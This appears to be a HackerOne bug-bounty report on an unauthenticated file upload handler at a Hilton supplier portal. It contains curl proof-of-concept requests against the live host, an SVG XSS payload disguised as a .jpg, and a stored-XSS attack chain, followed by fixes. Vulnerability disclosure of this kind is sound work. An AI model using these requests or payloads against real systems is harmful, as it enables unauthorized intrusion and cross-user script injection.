# HT-003: suppliersconnection.hilton.com — Unauthenticated File Upload Handler

**Program:** Hilton HackerOne  
**Asset:** `suppliersconnection.hilton.com` (Tier B)  
**Severity:** Medium  
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**CWE:** CWE-434 — Unrestricted Upload of File with Dangerous Type  
**Status:** Needs confirmation of persistent storage (authenticated session test pending)

---

## Summary

The file upload handler at `https://suppliersconnection.hilton.com/Handlers/FileUpload.ashx` is accessible without authentication. The handler:

1. Accepts requests from unauthenticated users (no 302 redirect to login)
2. Returns HTTP 200 for valid image extensions (.jpg, .jpeg, .png) — including when the request body contains an SVG XSS payload with a `.jpg` extension (indicating possible lack of content-type or magic byte validation)
3. Returns extension validation errors as JSON for blocked types (.svg, .aspx)
4. Returns the string `"uploaded"` for unknown `op` parameter values

**Key concern:** Image files accepted without authentication may be stored in the application's image directory (`/images/`, `/learninglounge/images/` confirmed to return 403 — directories exist), where they could be served to authenticated users visiting admin panels.

---

## Proof of Concept

### Test 1: Valid extension accepted (no auth)
```bash
# Create a test JPEG file with harmless content
echo -e '\xFF\xD8\xFF\xE0' > /tmp/test.jpg  # JPEG magic bytes

curl -si "https://suppliersconnection.hilton.com/Handlers/FileUpload.ashx?op=upload&type=image" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -F "file=@/tmp/test.jpg;type=image/jpeg" \
  --max-time 10
# Response: HTTP 200, content-length: 0 (accepted, no auth required)
```

### Test 2: SVG with .jpg extension (magic byte bypass test)
```bash
cat > /tmp/xss_test.jpg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
<script>alert(document.domain)</script></svg>
EOF

curl -si "https://suppliersconnection.hilton.com/Handlers/FileUpload.ashx?op=upload&type=image" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -F "file=@/tmp/xss_test.jpg;type=image/jpeg" \
  --max-time 10
# Response: HTTP 200, body empty (accepted without content-type validation)
```

### Test 3: .svg extension — blocked
```bash
curl -si "https://suppliersconnection.hilton.com/Handlers/FileUpload.ashx?op=upload&type=image" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -F "file=@/tmp/test.svg;type=image/svg+xml" \
  --max-time 10
# Response: HTTP 200, body: {"InvalidImageExtension":"InvalidImageExtension"}
```

### Test 4: .aspx extension — blocked
```bash
# Response: HTTP 200, body: {"InvalidImageExtension":"InvalidImageExtension"}
```

### Confirmed directory existence:
```bash
curl -si "https://suppliersconnection.hilton.com/images/"                # 403
curl -si "https://suppliersconnection.hilton.com/learninglounge/images/" # 403
curl -si "https://suppliersconnection.hilton.com/LearningLounge/Images/" # 403
```

---

## Behavior Summary

| Extension | Content | Result |
|-----------|---------|--------|
| `.jpg` | JPEG magic bytes | HTTP 200, accepted |
| `.jpg` | SVG XSS payload | HTTP 200, accepted (no magic byte check) |
| `.jpg` | GIFAR (GIF+SVG) | HTTP 200, accepted |
| `.png` | PNG magic bytes | HTTP 200, accepted |
| `.svg` | any | 200 + `{"InvalidImageExtension":"..."}` |
| `.aspx` | any | 200 + `{"InvalidImageExtension":"..."}` |

---

## Attack Chain (if storage is persistent)

```
1. Upload SVG XSS payload with .jpg extension (unauthenticated)
   POST /Handlers/FileUpload.ashx → HTTP 200 (accepted)
   
2. File stored in /images/ or /learninglounge/images/

3. An authenticated admin creates an announcement/tile pointing to 
   the uploaded "image" URL

4. When other admins or suppliers view the announcement/tile:
   Browser loads /images/xss_payload.jpg
   Browser sniffs content as SVG (despite .jpg extension)
   XSS executes in the context of suppliersconnection.hilton.com
   
Attack impact: Stored XSS affecting all authenticated suppliers
Estimated severity: HIGH (cross-user stored XSS)
```

**Note:** Step 2-4 requires verification with an authenticated session. The current finding (Step 1) is confirmed: unauthenticated upload accepted without content validation.

---

## Impact

**Confirmed:**
- Authentication bypass on file upload handler (MEDIUM standalone)
- No magic byte / content-type validation (dangerous SVG content accepted with .jpg extension)

**Potential (pending authenticated testing):**
- Persistent storage → served SVG-as-JPEG → Stored XSS (HIGH)
- GIFAR attack vector (animated GIF with malicious JavaScript payload)
- If stored with attacker-controlled filename: path traversal attempts

---

## Recommendations

1. **Require authentication**: Redirect unauthenticated requests to login page (same pattern as other handlers).
2. **Content-type validation**: Verify actual file content (magic bytes) matches declared extension.
3. **Allowlist content-types**: Only accept `image/jpeg`, `image/png`, `image/gif` with matching magic bytes.
4. **Reject SVG entirely**: SVG can contain JavaScript regardless of extension.
5. **Randomize upload filenames**: Prevent prediction/enumeration of stored file paths.
6. **Set `Content-Disposition: attachment`** on served files to prevent browser MIME-sniffing.
